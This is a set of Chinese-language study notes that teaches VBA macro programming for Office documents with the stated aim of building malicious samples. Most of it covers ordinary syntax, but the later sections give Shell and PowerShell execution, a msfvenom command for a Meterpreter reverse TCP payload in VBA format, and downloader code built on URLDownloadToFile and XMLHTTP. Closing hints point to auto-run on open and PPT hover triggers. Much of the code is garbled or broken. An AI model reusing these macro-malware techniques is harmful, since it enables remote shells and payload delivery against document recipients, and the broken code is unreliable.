很多样本会结合office
针对于恶意样本的内容

vb
vba（加了很多适用于office场景的功能）

恶意样本通常使用那些东西
1.计算机
win32 api
命令行
shellcode

2.网络
网络请求
下载文件

# office
视图--》宏---》录制宏（选择当前工作薄）
录制完宏以后，可以执行
视图--》宏--》查看--》执行
视图--》宏--》查看--》编辑 ：可以查看代码![[12.png]]

## 编写规范
1.对缩进不敏感
2.所有的过程和函数还有属性都有类似如下：
sub aaaa（）
end sub

function aaaa（）
end function

3.如果这行就一行代码不需要分号

4.注释使用：''(单引号)

## 变量的定义

dim a as Interger

Dim a as  string
dim:保留字
a:变量名
as:保留字
string:变量类型

# 数据类型
byte
boolean
integer
double
long
object
string
Variant(不知道什么类型就写这个)
### 运算符
不等于：a<>b


# 变量的集合
## 1.数组
dim arr()' 定义数组' 
dim arr(10)'下标从0开始'
ReDim [Preseve] arr(1 To j)' '


``` vb
    Dim a As String;
    a = "aaaaa";
    VBA MsgBox(a);
'
```
dim arr(1 to 20)
arr = Range("A1:D9") '给数组赋值'
Range("A11")=arr(7,2)'数组第七行，第二列'

’最大值
Range("h3") = Application.WorksheetFunction.Max(arr)
'match是找到值在数组的位置，参数是要找的值，要找的数据，精确为0'
Range（"h2") = Range("a"& Application.WorksheetFunction.Match(Range("h3"),arr,0)+1)

'数组的上下界'
MsgBox UBound(arr)
MsgBox LBound(arr)

## 2.字典

'在VBE界面中， 工具一引用勾选Microsoft scripting runtime,没有就浏览scrrun.dll-确定'
Dim dic As New Dictionary
'推荐使用方法'
Dim dic
Set dic = CreateObject("Scripting.Dictionary")

'增加一项'
dic.Add Key,Item
'通过值取得，修改Item'
Range("A1") = dic(key)
dic(key) = 200

'通过作为key存入字典，去掉重复值，keys取出'
For i = LBound(arr) To UBound(arr)
	if arr(i,2)  = Me.ListBox1.Value Then
		dic(arr(i,3))=1
	End if
Next
Me.ListBox2.List = dic.keys

# 控制流程
## 1.判断
### 单条件判断

sub 判断1()
	if Range("A1").value >0 Then
		Range("B1")= "正数"
	Else
		Range("B1")= "负数"
	End IF
End Sub

### 多条件判断

Sub 判断1()
	if Range("A1").value > 0 Then
		Range("B1") = "正数"
	ElseIf Range("A1").value = 0 Then
		Range("B1")= "负数"
	End IF
End Sub

### 多条件判断
Sub 判断1()
	if Range("A1")<>""And Range("A2")<>"" Then
		Range("B1") = Range("A1")*  And Range("A2")
	End IF
End Sub
### 单语句判断

Sub 判断1()
	Range("B1").value = iif (Range("A1")<=0,"负数或0","正数")
End Sub

### select判断
 Sub 判断1()
	 Select Case Range("A1").value
	 Case 0 To 1000
		 Range("B1")="正数"
	 Case ls = 0
		 Range("B1")="0"
	Case Else
		Range("B1")="负数"
	End Select
End Sub

## 循环

#### 2.计数循环
``` vba
Sub test2()
Dim x As Interger  `声明变量
	For x= 1000 To 10 Step-1
		Cells(x,1)=x
	Next x
End Sub
```

``` vba
Sub test2()
Dim rg As interger
	For Each rg in Range("d2:d18")
		rg = "a"
	Next rg
End Sub
```

#### 3条件循环
``` vba
Sub test2()
Dim x As interger
	x=1
	Do
		x = x+1
		Cells(x,4) = Cell(x,2)*Cell(x,3)
	Loop Until x = 18
End Sub
```

``` vba
Sub test2()
Dim x As interger
	x=1
	Do while x<18
		x = x+1
		Cells(x,4) = Cell(x,2)*Cell(x,3)
		if Cell(x,4) = 255 Then
			Cell(x,4)=0
			Exit Do `跳出循环
	Loop
End Sub
```

### goto

``` vba
Sub test()
	Dim st
100:
	st=Application.InputBox("请输入数字",)
	if len(st) = 0 Then GoTo 100
End Sub
```

### 函数：
``` vab
Sub 宏1()
	Call test("a")
End Sub

Sub test(str As String)
	Range("A1")=str
End Sub
```

Public(更广)和Private 表示不同的调用范围
### win32api
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA"_(ByVal IpBuffer As String,ByVal nSize As Long) As Long

Sub 宏1()
Dim sPath As String * 260,lLen As Long
lLen = GetSystemDirectory(sPath,260)
Text3 = Left(sPath,lLen)
VBA.MsgBox(Text3)

End Sub


api对应类型
lpstr = string
所有带P或者你认为有指针的 = long

如果存在空间要求的必须要在定义变量的时候把大小定义好
### cmd

shell("")
shell("cmd /c echo 111 >1.txt")

shell("powershell echo 111 >1.txt")

msf : msfvenom -p windows/meterpreter/reverse_tcp lhost-192.168.2.213 lport-4444 -f vba


win32api 和恶意样本相关的书《C++黑客编程》

### 下载文件
#### 使用api：
Private Declare Function URLDownloadToFile Lib"urlmon" Ailas _ "URLDownloadToFileA"(ByVal pCaller As Long, ByVal szURL As Long,ByVal IpfnCB As Long) As Long

Pubicl Function downloadFile(ByVal strURL As String,ByVal strFile As String) As Boolean
	Dim IngReturn&
	if IngReturn = 0 Then
		downloadFile =True
	Else 
		downloadFile = False
	End if
End Function

Sub 宏1()
	Dim a As Boolean
	a = downloadFile("http://www.baidu.com","F:\1.html")
End Sub

当win32api函数存在一个立即数的返回值的时候，vba里面必须要有一个东西来接收它

### 使用xmlhttp：
``` vba
Public Function DloadFile(ByVal strURL As String,ByVal strFile As String) As Boolean
  Dim H,S
  Set H = CreateObject("Microsoft.XMLHTTP")
  H.Open "GET",strURL,False `文件网址
  H.send
  Set S = CreateObject("ADODB.Stream")
  S.Type = 1 `二进制
  S.Open
  S.write H.Responsebody `写入读取的内容
  S.savetofile str File,2 `保存文档
  S.Close
End Function


Sub 宏1()
	if DloadFile(("http://www.baidu.com","F:\1.html") Then
		VBA.MsgBox("下载成功")
	End If
End Sub
```

## 控件的编写
### excel 2013的开发工具在哪，怎么调出来
1.打开Excel，点击工具条上的'文件'
2.打开后，点击'选项'
3.打开后，点击左边的'自定义功能区'
4.然后再这里把'开发工具'勾选上就行了。点击确定按钮
5.现在在Excel的工具条上就可以看到开发工具了。

如果存在打开office就中招:
https://security.tencent.com/index.php/blog/msg/165
office dll
做一个权限
https://www.bilibili.com/video/BV18q4y1j7NF/

ppt的悬停

除非利用office的漏洞